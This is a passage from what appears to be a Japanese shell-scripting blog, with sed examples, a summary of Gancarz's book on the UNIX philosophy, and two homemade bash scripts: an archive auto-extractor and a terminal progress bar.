<p>各行に単語のペアを含む次のコンテンツを含むcourse.txtという名前のテキストファイルを作成します。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:course.txt data-lang=:course.txt>PHP            ASP
MySQL          Oracle
CodeIgniter    Laravel
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ cat course.txt
PHP ASP
MySQL Oracle
CodeIgniter Laravel
$
$ cat course.txt | sed 's/\([^ ]*\) *\([^ ]*\)/\2 \1/'
ASP PHP
Oracle MySQL
Laravel CodeIgniter
$
</code></pre><h3 id=各単語の最初の文字を大文字に変換する>各単語の最初の文字を大文字に変換する</h3>
<p>次の<code>sed</code>コマンドは、<code> echo</code>コマンドから入力テキストを受け取り、各単語の最初の文字を大文字に変換します。</p>
<pre tabindex=0><code>$ echo &quot;I like bash programming&quot; | sed 's/\([a-z]\)\([a-zA-Z0-9]*\)/\u\1\2/g'
I Like Bash Programming
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>ここまでくると、カルト級ですね。使いこなせる人がいればほぼ神業ですね。</dd>
</dl>
</div>
<h3 id=ファイルの行番号を出力する>ファイルの行番号を出力する</h3>
<p>&lsquo;=&lsquo;記号は、ファイルの各行の前に行番号を出力するために<code>sed</code>コマンドで使用されます。次のコマンドは、os.txtファイルの内容を行番号とともに出力します。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:os.txt data-lang=:os.txt>Windows
Linux
Android
OS
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ cat os.txt
Windows
Linux
Android
OS
$
$ cat os.txt |sed '='
1
Windows
2
Linux
3
Android
4
OS
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>できれば行頭に行番号が来てほしいですね。工夫して頑張って作ってみてください。</dd>
</dl>
</div>
<pre tabindex=0><code>$ cat os.txt | sed '=' | sed 'N;s/\n/ /'
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>楽しめましたか？では</dd>
</dl>
</div>
<h2 id=名著紹介unixという考え方>【名著紹介】「UNIXという考え方」</h2>
<p>これほどまでシンプルに「UNIX/Linuxとは」について書かれた本はない。</p>
<p>「エンジニアとしての信念はUNIXである」とはどういうことなのか。「プログラマとしてのコンセプトはLinuxなのだ」とはどういうことなのか。</p>
<p>そうした、少し偏屈なエンジニアに読んでもらいたい。また、UNIX/Linuxに興味を持っている若者の手にとってもらいたい。</p>
<p>安心してほしい。旅のしおり程度の大きさで厚さは文庫本の半分にも満たない。しかしその中身は、多くのエンジニアを下支えしてきたUNIXという骨について、わかりやすく、かんたんに、そして記憶に残るかずかずの珠玉の言葉を添えしっかりと書かれている。</p>
<p>稚拙ではあるが、ざっくりと要点も付け加えたので興味を持ってもらえたなら、ネット通販などでお買い求めいただきたい。</p>
<p>エンジニアには必須の名著一冊、ここに紹介する。</p>
<p><figure>
<a href=https://suzukiiichiro.github.io/unix.jpg>
<img src=https://suzukiiichiro.github.io/unix.jpg loading=lazy alt=UNIXという考え方>
</a>
</a>
<figcaption>UNIXという考え方</figcaption>
</figure></p>
<p>「UNIXという考え方」<br>
著者 Mike Gancarz 著、芳尾 桂 監訳<br>
定価 1,760円 （本体1,600円＋税）<br>
判型 A5<br>
頁 168頁<br>
ISBN 978-4-274-06406-7<br>
発売日 2001/02/24<br>
発行元 オーム社</p>
<h3 id=unix的なものの考え方とは何か>UNIX的なものの考え方とは何か？</h3>
<p>UNIXをUNIXらしく使いこなしたい、UNIXらしいプログラムを作りたい人のための一冊です。<br>
OSの背後にある哲学を、9つの定理と平易な言葉で説く<br>
OSを使いこなすためには、その背後にある「哲学」を理解することが必要です。本書では技術的詳細には立ち入らず、その代わりに、今まで文章で表されることが少なかったUNIXの考え方を、9つの「定理」にまとめて平易な言葉で明らかにしています。</p>
<p>定理1：スモール・イズ・ビューティフル<br>
定理2：一つのプログラムには一つのことをうまくやらせる<br>
定理3：できるだけ早く試作を作成する<br>
定理4：効率より移植性<br>
定理5：数値データはASCIIフラットファイルに保存する<br>
定理6：ソフトウェアの挺子を有効に活用する<br>
定理7：シェルスクリプトを使うことで挺子の効果と移植性を高める<br>
定理8：過度の対話的インタフェースを避ける<br>
定理9：すべてのプログラムをフィルタにする</p>
<h3 id=このような方におすすめ>このような方におすすめ</h3>
<p>UNIX系OSのユーザ、プログラマ。UNIXの世界観に興味のある人</p>
<h3 id=主要目次>主要目次</h3>
<p>イントロダクション<br>
第1章　UNIXの考え方：たくさんの登場人物たち<br>
第2章　人類にとっての小さな一歩<br>
第3章　楽しみと実益をかねた早めの試作<br>
第4章　移植性の優先順位<br>
第5章　これこそ挺子の効果!<br>
第6章　対話的プログラムの危険性<br>
第7章　さらなる10の小定理<br>
第8章　一つのことをうまくやろう<br>
第9章　UNIXと他のオペレーティングシステムの考え方</p>
<h3 id=詳細目次>詳細目次</h3>
<p>第1章　UNIXの考え方：たくさんの登場人物たち<br>
1.1 UNIXの考え方：簡単なまとめ</p>
<p>第2章　人類にとっての小さな一歩<br>
2.1 定理1：スモール・イズ・ビューティフル<br>
2.2 やさしいソフトウェア工学<br>
2.3 定理2：一つのプログラムには一つのことをうまくやらせる</p>
<p>第3章　楽しみと実益をかねた早めの試作<br>
3.1 定理3：できるだけ早く試作を作成する<br>
3.2 人間による三つのシステム<br>
3.3 人間による第一のシステム<br>
3.4 人間による第二のシステム<br>
3.5 人間による第三のシステム<br>
3.6 第三のシステムの構築</p>
<p>第4章　移植性の優先順位<br>
4.1 定理4：効率より移植性<br>
4.2 事例研究——Atari 2600<br>
4.3 定理5：数値データはASCIIフラットファイルに保存する<br>
4.4 事例研究——あるUNIXプログラマの道具袋</p>
<p>第5章　これこそ挺子の効果!<br>
5.1 定理6：ソフトウェアの梃子を有効に活用する<br>
5.2 定理7：シェルスクリプトを使うことで梃子の効果と移植性を高める</p>
<p>第6章　対話的プログラムの危険性<br>
6.1 定理8：過度の対話的インタフェースを避ける<br>
6.2 定理9：すべてのプログラムをフィルタにする<br>
6.3 UNIX環境：プログラムをフィルタとして使う</p>
<p>第7章　さらなる10の小定理<br>
7.1 (1) 好みに応じて自分で環境を調整できるようにする<br>
7.2 (2) オペレーティングシステムのカーネルを小さく軽くする<br>
7.3 (3) 小文字を使い、短く<br>
7.4 (4) 木を守る<br>
7.5 (5) 沈黙は金<br>
7.6 (6) 並行して考える<br>
7.7 (7) 部分の総和は全体よりも大きい<br>
7.8 (8) 90パーセントの解を目指す<br>
7.9 (9) 劣るほうが優れている<br>
7.10 (10) 階層的に考える</p>
<p>第8章　一つのことをうまくやろう<br>
8.1 UNIXの考え方：総括</p>
<p>第9章　UNIXと他のオペレーティングシステムの考え方<br>
9.1 Atariホームコンピュータ——芸術としての人間工学<br>
9.2 MS-DOS——7000万人以上のユーザが間違っているはずがない<br>
9.3 OpenVMS——UNIXへのアンチテーゼ？</p>
<h3 id=ざっくりななめよみ鈴木めも>ざっくりななめよみ、鈴木めも</h3>
<h3 id=小さいものは美しいスモールイズビューティフル>小さいものは美しい　「スモールイズビューティフル」</h3>
<p>小さなプログラムはわかりやすい<br>
小さなプログラムは保守しやすい<br>
小さなプログラムはシステムリソースに易しい<br>
小さなプログラムは他のツールと組み合わせやすい</p>
<p>「伝統的なプログラマは、巨大なアメリカンプログラムによって、<br>
　　世界中の全ての問題を一つのプログラムで解決しようとする。」<br>
「プログラムの９０％はクズである。<br>
　　ただしあらゆるものの９０％はクズである。」</p>
<p>パラメータが一行に収まらない<br>
メソッドが画面に収まらない<br>
コメントを読まないと何をやっているのか思い出せない<br>
lsでモジュール名が多すぎて画面の端から消えていってしまう<br>
まだ開発中なのにエラーメッセージの意味を思い出せない<br>
整理するためにソースコードを出力している自分に気がついた</p>
<h3 id=一つのプログラムには一つの事をうまくやらせるわかることは分けること>一つのプログラムには一つの事をうまくやらせる　「わかることは分けること」</h3>
<p>「UNIXユーザーは、自分が何をしているのかをわかっている。<br>
　　何をしているのかわからないのなら、ここにいるべきではない」<br>
「一つの事をうまくやるようにプログラムを作れないのであれば、<br>
　　おそらく問題をまだ完全に理解していない。」</p>
<p>a)ユーザーとの対話が必要か。パラメータではだめか<br>
b)入力データは特殊フォーマットが必要か。フォーマット変換プログラムがすでにシステム上にないか。<br>
c)出力データは特殊フォーマットが必要か。通常のASCIIファイルではだめか。<br>
d)新しいプログラムを書かずとも似たような機能を持つ他のプログラムがあるのではないか。</p>
<p>「一つの事をうまくやるようにプログラムを作れないのであれば、<br>
　　おそらく問題をまだ完全に理解していない。」<br>
「しのびよる多機能主義。<br>
　　プログラマはいつだってプログラムを遅くする方法を見つける。」</p>
<p>一つの事をうまくやるようにアプリケーションを書けば、それは必然的に小さなプログラムになる。<br>
小さなプログラムは単一機能になる傾向があり、単一機能のプログラムは小さくなる傾向がある。</p>
<h3 id=出来るだけ早く試作する反復と協調>出来るだけ早く試作する　「反復と協調」</h3>
<p>「試作によって学ぶ。早い試作はリスクを減らす。<br>
　「正しく」やっている時間などない」<br>
「「なにができるか」<br>
　　むしろ重要な事は、「なにができないか」を知る事だ。」</p>
<p>三つのシステム<br>
１．第一のシステム<br>
　第一のシステムは正しくやっている時間などない。<br>
　第一のシステムは追い詰められた人間が作る。<br>
　第一のシステムのコンセプトは人々の想像力を刺激する。<br>
　第一のシステムは一人かせいぜい数人からなる小さなグループで作られる。<br>
　第一のシステムは高い情熱によって推進され開発は急速に進む。<br>
　第一のシステムは実に性能がよい。</p>
<p>２．第二のシステム<br>
　第二のシステムは第一のシステムで証明されたアイデアを継承する。<br>
　第二のシステムは委員会が設計する。<br>
　第二のシステムは委員会によりものごとを全て公開の場で自分自身の正当化のために議論を進める。<br>
　第二のシステムは第一のシステムの成功に便乗し分け前にあずかろうとする自称専門家で作られる。<br>
　第二のシステムは自称専門家によりリポジトリ、進捗管理ツールが導入され計画は遅延する。<br>
　第二のシステムは自称専門家のプログラムにおきかえられ贅肉がつき象のようにゆっくり動く。<br>
　第二のシステムは「最初の設計のひどい欠点を見違えるように改善」され多機能となり無知が使う。<br>
　第二のシステムは三つのシステムの中で最悪のシステムである。</p>
<p>３．第三のシステム<br>
　第三のシステムはこれまでのシステムへの反抗から生まれる。<br>
　第三のシステムの名前が変わり、オリジナルのアイデアはもはや常識となる。<br>
　第三のシステムは第一と第二のシステムの最良の特徴を組み合わせる。<br>
　第三のシステムは設計者にとってようやく「正しく」やる事が出来る。<br>
　第三のシステムはユーザーが実際に使用する機能しか含まれない。<br>
　第三のシステムはディスク、メモリ、CPUサイクルなど最適なバランスが実現されている。<br>
　第三のシステムは提供される性能レベルも良くバランスがとれている。</p>
<p>第一のシステムとして「試作」を１ナノ秒でも早く作り、<br>
　第一のシステムと第二のシステムのサイクルを反復と協調し、<br>
　　第三のシステムに向かって協力しながら進んでいく。</p>
<h3 id=効率より移植性bashとawkとsed>効率より移植性　bashとawkとsed</h3>
<p>「最も効率の良い方法は、<br>
　　ほとんどの場合「移植性」に欠ける。」<br>
「移植か死か。優れたソフトウェアは移植され成長し、<br>
　　それ以外は取り残され捨てられる。」</p>
<p>UNIXにおいてそれはシェルスクリプトしかない。<br>
次のハードウェアはもっと速く走る。だからプログラムを速くするという誘惑に負けない。<br>
わずかな速度を求めてCで書き直さない。それは時間の無駄だ。</p>
<p>シェルスクリプトをあれこれいじる余裕が一瞬でも生じればほとんどのプログラマは<br>
　a) 新しい機能をいくつか付け加えようとする<br>
　b) スクリプトそのものを洗練し、実行速度を高めようとする<br>
　c) その一部、または大部分をCで書き直してパフォーマンスの向上を図ろうとする。</p>
<p>「最も効率の良い方法は、<br>
　　ほとんどの場合「移植性」に欠ける。」<br>
「移植か死か。優れたソフトウェアは移植され成長し、<br>
　　それ以外は取り残され捨てられる。」</p>
<p>DQ1カートリッジ(64kb)用のコード<br>
　自分のプログラマ人生で最も効率の良い、そして移植の難しいコード」を書いた。<br>
　命令をデータとして扱い、データを命令として扱った。<br>
　走査線が画面の右端から左端に引き返すまでの間を狙って命令を実行した。<br>
　メモリ節約のためありとあらゆる技を駆使した。<br>
　こうしてできあがったコードは芸術品と言えるほど見事なものだった。<br>
　フォルクスワーゲンのビートルに２０人ほど詰め込むようなものだった。<br>
　そして保守担当者にとっては究極の悪夢でもあった。</p>
<h3 id=出力結果はasciiフラットファイルに保存する中間ファイルは作らないrdbは使わない>出力結果はASCIIフラットファイルに保存する　中間ファイルは作らない　RDBは使わない</h3>
<p>「動かせないデータは死んだデータだ。」</p>
<p>出力結果はASCIIフラットファイルに保存する。<br>
安易と稚拙な知識でRDBを使わない。<br>
むやみに中間ファイルをはき出さない。<br>
素晴らしいシステムは中間ファイルI/Oがゼロで、<br>
全てがメモリ上で稼働する。よってそこそこ高速に動く。</p>
<h3 id=ソフトウェアを梃子として使う>ソフトウェアを梃子として使う　</h3>
<p>「良いプログラマはよいコードを書く。<br>
　　偉大なプログラマは良いコードを借りてくる。」</p>
<p>梃子の支点をいかに自分のほうに近づける事が出来るか<br>
独自技術症候群を避け、すでにあるものにクリエイティブな付加価値をつける<br>
独自技術症候群は創造性を伸ばさない。</p>
<p>「良いプログラマはよいコードを書く。<br>
　　偉大なプログラマは良いコードを借りてくる。」</p>
<h3 id=シェルスクリプトによって梃子の効果と移植性を高めるパイプ>シェルスクリプトによって梃子の効果と移植性を高める　パイプ</h3>
<p>「私は人生で二度しか奇跡を見た事がない。<br>
　　一つは核融合、もう一つは複利だ<br>
　　　少量のものを繰り返し掛け合わせていく事で、<br>
　　　　やがて奇跡的な規模に達する。」</p>
<p>シェルスクリプトには恐ろしいほどの梃子（てこ）の効果がある<br>
シェルスクリプトは梃子の降下で時間も節約する<br>
シェルスクリプトはCより移植性が高い</p>
<p>「熟練プログラマはシェルスクリプトを熱心に使う。<br>
　　あなたもまたそうするべきだ。」<br>
「UNIXの源流は高水準の抽象化モデル「シェルスクリプト」であり、<br>
　　それは今も普遍である。」<br>
「私は人生で二度しか奇跡を見た事がない。<br>
　　一つは核融合、もう一つは複利だ<br>
　少量のものを繰り返し掛け合わせていく事で、<br>
　　やがて奇跡的な規模に達する。」アインシュタイン</p>
<p>シェルスクリプト一行はおよそ１万倍の複利を生む</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>echo</span> who <span class=p>|</span> awk <span class=s1>&#39;{ print $1 ; }&#39;</span> <span class=p>|</span> sort <span class=p>|</span> uniq <span class=p>|</span> sed -e <span class=s2>&#34;s/  /,  /g&#34;</span> <span class=p>;</span>
</code></pre></div><pre tabindex=0><code>echo   177
who    755
awk   3411
sort  2614
uniq   302
sed   2093
---------------------
　　  9.353
</code></pre><p>処理をパイプでつなぎ処理全体を一行で完結させる。<br>
「ひとつのことをうまくやる」の良い事例だ。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=k>function</span> sh_func_getTitle<span class=o>()</span> <span class=o>{</span>
  <span class=nv>TITLE</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=si>${</span><span class=nv>URLGETOPT</span><span class=si>}</span> <span class=p>|</span> <span class=se>\
</span><span class=se></span>    <span class=k>while</span> <span class=nb>read</span> line <span class=p>;</span><span class=k>do</span>
      <span class=k>if</span> <span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$line</span><span class=s2>&#34;</span> <span class=p>|</span> grep -i <span class=s2>&#34;title=&#34;</span> &gt; /dev/null<span class=p>;</span> <span class=k>then</span>
        <span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$line</span><span class=s2>&#34;</span> <span class=p>|</span> <span class=se>\
</span><span class=se></span>          sed -e <span class=s2>&#34;s/^.*title=\x27//g&#34;</span> <span class=se>\
</span><span class=se></span>              -e <span class=s2>&#34;s/\x27.*</span>$<span class=s2>//g&#34;</span> <span class=se>\
</span><span class=se></span>              -e <span class=s2>&#34;s/\r//g&#34;</span> <span class=se>\
</span><span class=se></span>              -e <span class=s2>&#34;s/&lt;[^&gt;]*&gt;//g&#34;</span> <span class=se>\
</span><span class=se></span>              -e <span class=s2>&#34;s/^[●○■□△▽]//g&#34;</span><span class=p>;</span> 
      <span class=k>fi</span>
    <span class=k>done</span>
  <span class=k>)</span><span class=p>;</span>
<span class=o>}</span>
</code></pre></div><h3 id=全てのプログラムをフィルタとして設計する>全てのプログラムをフィルタとして設計する</h3>
<p>　メソッド間の入力をstdin、出力はstdoutを使用する<br>
オンメモリでコマンドフィルタとして稼働する。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=k>function</span> trim<span class=o>(){</span>
  <span class=k>if</span> <span class=o>[</span> -p /dev/stdin <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
    cat - <span class=p>;</span>
  <span class=k>else</span>
    <span class=nb>echo</span> -n <span class=p>;</span>
  <span class=k>fi</span> <span class=p>|</span> sed -e <span class=s1>&#39;s/^ *//g&#39;</span> -e <span class=s1>&#39;s/ *$//g&#39;</span>
<span class=o>}</span>
</code></pre></div><p>実行結果</p>
<pre tabindex=0><code>echo &quot;      ほげ      &quot; | trim ;
ほげ
</code></pre><p>以下でも良い。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=k>function</span> trim<span class=o>(){</span>
  awk <span class=s1>&#39;{ print $1; }&#39;</span> <span class=p>|</span> sed -e <span class=s1>&#39;s/^ *//g&#39;</span> -e <span class=s1>&#39;s/ *$//g&#39;</span>  &lt;/dev/stdin
<span class=o>}</span>
</code></pre></div><p>実行結果</p>
<pre tabindex=0><code>echo &quot;      ほげ      &quot; | trim ;
ほげ
</code></pre><h3 id=並行して考える>並行して考える</h3>
<p>　並列処理が可能なメソッドを積極的に書く</p>
<p>並列処理が可能なメソッドを積極的に書く</p>
<p>メソッドの並列処理</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=cp>#!/bin/bash
</span><span class=cp></span>
<span class=c1>##</span>
<span class=c1>#</span>
<span class=c1>#</span>
<span class=k>function</span> cmd<span class=o>(){</span> 
  <span class=nb>echo</span> <span class=s2>&#34;Hello, </span><span class=nv>$1</span><span class=s2>!&#34;</span><span class=p>;</span> 
<span class=o>}</span>
<span class=c1>##</span>
<span class=c1>#</span>
<span class=c1>#</span>
<span class=k>function</span> sh_xargs<span class=o>(){</span>
  <span class=nb>export</span> -f cmd
  yes <span class=p>|</span> head -1000 <span class=p>|</span> xargs -n1 -P4 -I % bash -c <span class=s2>&#34;cmd %&#34;</span>
<span class=o>}</span>
<span class=c1>##</span>
<span class=c1>#</span>
<span class=c1>#</span>
sh_xargs <span class=p>;</span>
</code></pre></div><h3 id=木を守る>木を守る</h3>
<p>　UNIXはドキュメントを忌み嫌う</p>
<p>UNIXユーザーは紙のドキュメントを忌み嫌う。不要なドキュメントを出力して整理する事はしない。<br>
ソースコードが実体であり、高水準のドキュメントとなるようプログラムする。</p>
<h2 id=自作コマンド圧縮ファイル自動解凍ツール>【自作コマンド】圧縮ファイル自動解凍ツール</h2>
<p>圧縮されているファイルを、ファイルの拡張子にあわせて解凍すると言う作業は、日常的に多いものです。今回は、圧縮ファイルの拡張子を判断して自動的に解凍するシェルスクリプトを作成してみます。</p>
<h3 id=圧縮ファイルと実行コマンドパラメータ一覧>圧縮ファイルと実行コマンド、パラメータ一覧</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>
  拡張子           パラメータ
  tgz <span class=p>|</span> tar.gz     tar zxvf  
  tar.Z            gunzip 
  tar.bz2          tar xvfj 
  tar              tar xvfz 
  gz               gunzip 
  Z                gunzip 
  bz2              bunzip2 
  zip              unzip 
</code></pre></div><p>こうしたコマンドやパラメータを覚えておくことは大切ですが、頭の経年劣化とともに、つい思い出すことができず、Googleで検索して調べると言ったことは、往々にしてあることです。</p>
<h3 id=実行例>実行例</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=c1># 圧縮ファイルを解凍する便利な unCompコマンド</span>
$ unComp comp.tar.gz2
</code></pre></div><h3 id=作成>作成</h3>
<p>まずファイルを作ります。ファイル名は unComp とします</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=c1># unComp というファイルを作成</span>
$ :&gt; unComp 

<span class=c1># vim で unComp を開く</span>
$ vim unComp
</code></pre></div><p>unCompファイルに以下の内容を貼り付ける</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=cp>#!/bin/bash
</span><span class=cp></span><span class=c1>#</span>
<span class=c1>#圧縮されているファイルを解凍する</span>
<span class=c1># unComp を /usr/local/bin/にコピーすると</span>
<span class=c1># 通常のコマンドとして本実行ファイルを利用する事が出来ます。</span>
<span class=c1>#</span>
<span class=c1># cp unComp /usr/local/bin/unComp</span>
<span class=c1>#</span>
<span class=c1># 実行例</span>
<span class=c1># $ unComp filename(圧縮ファイル)</span>
<span class=c1>#</span>
<span class=k>if</span> <span class=o>[</span> <span class=nv>$#</span> -ne <span class=m>1</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
  <span class=nb>echo</span> <span class=s2>&#34;&#34;</span>
  <span class=nb>exit</span> <span class=p>;</span>
<span class=k>fi</span>
<span class=c1>#</span>
<span class=k>case</span> <span class=nv>$1</span> in
  *.tgz <span class=p>|</span> *.tar.gz<span class=o>)</span>   tar zxvf <span class=nv>$1</span> <span class=p>;;</span>
  *.tar.Z<span class=o>)</span>            gunzip <span class=nv>$1</span>
                      tar xvf <span class=k>$(</span> <span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$1</span><span class=s2>&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/\.Z$//&#39;</span><span class=k>)</span>
                      <span class=p>;;</span>
  *.tar.bz2<span class=o>)</span>          tar xvfj <span class=nv>$1</span><span class=p>;;</span>
  *.tar<span class=o>)</span>              tar xvfz <span class=nv>$1</span><span class=p>;;</span>
  *.gz<span class=o>)</span>               gunzip <span class=nv>$1</span><span class=p>;;</span>
  *.Z<span class=o>)</span>                gunzip <span class=nv>$1</span><span class=p>;;</span>
  *.bz2<span class=o>)</span>              bunzip2 <span class=nv>$1</span><span class=p>;;</span>
  *.zip<span class=o>)</span>              unzip <span class=nv>$1</span><span class=p>;;</span>
  *<span class=o>)</span>                  <span class=nb>echo</span> <span class=s2>&#34;ファイルの拡張子が対応していません:</span><span class=nv>$1</span><span class=s2>&#34;</span>
<span class=k>esac</span>
<span class=nb>exit</span> <span class=p>;</span>
</code></pre></div><p>作成したファイルには日本語が含まれているため、unCompファイルを UTF-8に変換しておきます。<br>
<a class=link href=https://suzukiiichiro.github.io/posts/2021-12-23-suzuki/ title=wLu target=_blank rel=noopener>wLu</a>をつかってUTF-8に変換するとさらに便利です。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=c1># unComp ファイルをnkf -wLu でUTF-8に変換</span>
$ nkf -wLu unComp &gt; unComp.txt

<span class=c1># unComp.txtをunCompにリネームします</span>
$ mv unComp.txt unComp

<span class=c1># 作成したunCompコマンドファイルを/usr/local/bin にコピーします</span>
$ sudo unComp /usr/local/bin/

<span class=c1># コマンドが配置されたかを確認</span>
$ which unComp
$ /usr/local/bin/unComp
</code></pre></div><h3 id=使い方-1>使い方</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=c1># 圧縮ファイルの拡張子を気にせずをコマンド一発で解凍する</span>
<span class=c1># 実行</span>
$ unComp sample.zip
</code></pre></div><p>圧縮ファイルの拡張子に併せたコマンドを思い出したり、さらにはコマンドのパラメータをGoogleで調べたりする必要が減ります。必要に応じて、ソースにコマンドやパラメータを追加すれば、さらに拡張できます。<br>
便利ですね。</p>
<h2 id=自作コマンドプログレスバーの作成>【自作コマンド】プログレスバーの作成</h2>
<p>ターミナルで、処理の進捗が表示されるプログレスバーというのがあります。<br>
処理が進むにつれて、ジリジリとメーターが右に増えていくあれです。<br>
シェルスクリプトでも作れないものかとチャレンジしたので参考にして下さい</p>
<h3 id=使い方-2>使い方</h3>
<p>処理のループ中に以下の1行を追記します。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>progress <span class=s2>&#34;</span><span class=nv>$#</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$MAX</span><span class=s2>&#34;</span><span class=p>;</span> <span class=nb>set</span> - <span class=s2>&#34;</span><span class=nv>$@</span><span class=s2>&#34;</span> count <span class=p>;</span>
</code></pre></div><h3 id=実行手順>実行手順</h3>
<p>以下のソースコードを適当なファイル名で保存して下さい。ここではProgress.shとします。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ :&gt; Progress.sh
$ vim Progress.sh
<span class=c1># vimで以下のソースコードを貼り付けて保存</span>
<span class=c1># ソースコードのファイルエンコードをUTF-8に変更します。</span>
$ nkf -wLu Progress.sh &gt; Progress.sh.utf8
<span class=c1># ファイルエンコードを変更したファイルを元のファイル名にリネームします。</span>
$ mv Progress.sh.utf8 Progress.sh
<span class=c1># 実行権限を付与します</span>
$ chmod +x Progress.sh
<span class=c1># 実行</span>
$ ./Progress.sh
</code></pre></div><h3 id=ソースコード>ソースコード</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=cp>#! /bin/bash
</span><span class=cp></span>
<span class=c1>#######################################</span>
<span class=c1># 進捗を表示するプログレスバー</span>
<span class=c1>#  </span>
<span class=c1>#######################################</span>
<span class=c1>#</span>
<span class=c1>#</span>
<span class=c1># percent $1 </span>
<span class=c1># GT      $2</span>
progress<span class=o>(){</span>

  <span class=nv>percent</span><span class=o>=</span><span class=nv>$1</span><span class=p>;</span>
  <span class=nv>GT</span><span class=o>=</span><span class=nv>$2</span><span class=p>;</span>  

  <span class=nv>column</span><span class=o>=</span><span class=sb>`</span>expr <span class=m>71</span> <span class=se>\*</span> <span class=s2>&#34;</span><span class=nv>$percent</span><span class=s2>&#34;</span> / <span class=nv>$GT</span><span class=sb>`</span><span class=p>;</span>
  <span class=nv>nspace</span><span class=o>=</span><span class=sb>`</span>expr <span class=m>71</span> - <span class=s2>&#34;</span><span class=nv>$column</span><span class=s2>&#34;</span><span class=sb>`</span><span class=p>;</span>

  <span class=c1>#プログレスバーのカーソルを左端に戻すリターンコードと[の文字をbarに代入</span>
  <span class=nv>bar</span><span class=o>=</span><span class=s1>&#39;\r[&#39;</span><span class=p>;</span> 

  <span class=c1>#位置パラメータの数($#)を１にリセット（カウンタとして流用）</span>
  <span class=nb>set</span> dummy <span class=p>;</span>
  <span class=k>while</span> <span class=o>[</span> <span class=nv>$#</span> -le <span class=s2>&#34;</span><span class=nv>$column</span><span class=s2>&#34;</span> <span class=o>]</span><span class=p>;</span><span class=k>do</span>
    <span class=nv>bar</span><span class=o>=</span><span class=nv>$bar</span><span class=s1>&#39;=&#39;</span><span class=p>;</span>      <span class=c1># barに=を追加</span>
    <span class=nb>set</span> - <span class=s2>&#34;</span><span class=nv>$@</span><span class=s2>&#34;</span> dummy<span class=p>;</span> <span class=c1># $#をインクリメント</span>
  <span class=k>done</span>
  <span class=nv>bar</span><span class=o>=</span><span class=nv>$bar</span><span class=s1>&#39;&gt;&#39;</span><span class=p>;</span>        <span class=c1>#barの先端に&gt;を追加</span>

  <span class=c1>#位置パラメータの数($#)を１にリセット（カウンタとして流用）</span>
  <span class=nb>set</span> dummy <span class=p>;</span>
  <span class=k>while</span> <span class=o>[</span> <span class=nv>$#</span> -le <span class=s2>&#34;</span><span class=nv>$nspace</span><span class=s2>&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>do</span> 
    <span class=nv>bar</span><span class=o>=</span><span class=nv>$bar</span><span class=s1>&#39; &#39;</span><span class=p>;</span>
    <span class=nb>set</span> - <span class=s2>&#34;</span><span class=nv>$@</span><span class=s2>&#34;</span> dummy<span class=p>;</span>
  <span class=k>done</span>
  <span class=nv>bar</span><span class=o>=</span><span class=nv>$bar</span><span class=s1>&#39;]&#39;</span><span class=nv>$percent</span>/<span class=nv>$GT</span><span class=s1>&#39;\c&#39;</span><span class=p>;</span> <span class=c1># barに]と１行分のプログレスバーを表示</span>

  <span class=nb>echo</span> -e <span class=s2>&#34;</span><span class=nv>$bar</span><span class=s2>&#34;</span><span class=p>;</span> 
<span class=o>}</span>

<span class=c1>#######################################</span>
<span class=c1># メイン処理</span>
<span class=c1>#</span>
<span class=nb>set</span> count <span class=p>;</span>
<span class=nv>MAX</span><span class=o>=</span><span class=m>100</span> <span class=p>;</span> <span class=c1>#最大値を100とする。実際に掛かる処理数の最大値を入れて下さい。</span>
<span class=c1>#</span>
<span class=k>for</span> <span class=o>((</span> <span class=nv>i</span><span class=o>=</span>0<span class=p>;</span> i&lt;<span class=nv>$MAX</span><span class=p>;</span> i++<span class=o>)){</span>
  <span class=c1># ループする処理に以下の一行を埋め込めばプログレスバーが表示されます。</span>
  progress <span class=s2>&#34;</span><span class=nv>$#</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$MAX</span><span class=s2>&#34;</span><span class=p>;</span> <span class=nb>set</span> - <span class=s2>&#34;</span><span class=nv>$@</span><span class=s2>&#34;</span> count <span class=p>;</span>
<span class=o>}</span>
<span class=nb>echo</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
<span class=c1>#</span>
<span class=c1>#終了</span>
<span class=nb>exit</span> <span class=p>;</span>
</code></pre></div><h3 id=使い方-3>使い方</h3>
<p>シェルスクリプトで自作したなんらかの処理ファイルにprogress()関数を貼り付けます。</p>
<p>自作ソースの中のループ処理の関数の頭に以下を追記します。<br>
MAX=100; は、処理の最大値を指定します。<br>
